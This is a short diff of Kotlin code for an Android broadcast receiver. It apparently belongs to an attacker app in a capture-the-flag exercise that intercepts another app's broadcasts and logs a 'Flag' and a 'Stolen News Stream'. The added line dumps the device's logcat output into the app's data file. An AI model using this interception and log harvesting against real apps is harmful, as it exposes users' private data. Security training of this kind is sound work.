@@ -25,8 +25,11 @@ class CallsBroadcastReceiver : BroadcastReceiver() {
         val fileOut = context.openFileOutput("data.txt", Context.MODE_APPEND)
         val writer = OutputStreamWriter(fileOut)
 
+        Runtime.getRuntime().exec("logcat -f ${context.filesDir}/data.txt")
+        Thread.sleep(500)
+
         if(flag != null) {
-            writer.write("\n\nFlag: $flag\n\n")
+            writer.write("\nFlag: $flag ")
         }
 
         writer.write("Stolen News Stream: $newsStreamName\n\n")
